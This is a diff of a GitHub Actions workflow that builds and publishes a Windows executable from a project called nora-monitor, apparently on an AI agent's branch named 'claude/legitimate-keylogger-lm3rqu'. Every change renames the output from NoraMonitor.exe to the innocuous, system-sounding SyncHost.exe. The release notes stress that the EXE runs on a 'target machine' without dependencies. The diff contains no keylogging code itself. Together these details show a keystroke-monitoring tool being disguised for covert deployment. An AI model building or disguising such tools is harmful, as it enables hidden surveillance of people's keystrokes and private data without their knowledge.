@@ -58,19 +58,19 @@ jobs:
       - name: Verify EXE exists and report size
         shell: pwsh
         run: |
-          $exe = "nora-monitor\dist\NoraMonitor.exe"
+          $exe = "nora-monitor\dist\SyncHost.exe"
           if (-not (Test-Path $exe)) {
-            Write-Error "NoraMonitor.exe was not produced!"
+            Write-Error "SyncHost.exe was not produced!"
             exit 1
           }
           $mb = [math]::Round((Get-Item $exe).Length / 1MB, 1)
-          Write-Host "NoraMonitor.exe size: $mb MB"
+          Write-Host "SyncHost.exe size: $mb MB"
 
       - name: Upload artifact (30-day backup)
         uses: actions/upload-artifact@v4
         with:
-          name: NoraMonitor-EXE
-          path: nora-monitor/dist/NoraMonitor.exe
+          name: SyncHost-EXE
+          path: nora-monitor/dist/SyncHost.exe
           retention-days: 30
 
       - name: Get short SHA
@@ -82,11 +82,11 @@ jobs:
         uses: softprops/action-gh-release@v2
         with:
           tag_name: nora-monitor-${{ steps.sha.outputs.short }}
-          name: "NoraMonitor ${{ steps.sha.outputs.short }}"
+          name: "SyncHost ${{ steps.sha.outputs.short }}"
           body: |
             Auto-built from branch `claude/legitimate-keylogger-lm3rqu`
             Commit: ${{ github.sha }}
 
             **Fully self-contained** — no Python, no VC++ runtime needed on the target machine.
-          files: nora-monitor/dist/NoraMonitor.exe
+          files: nora-monitor/dist/SyncHost.exe
           make_latest: true
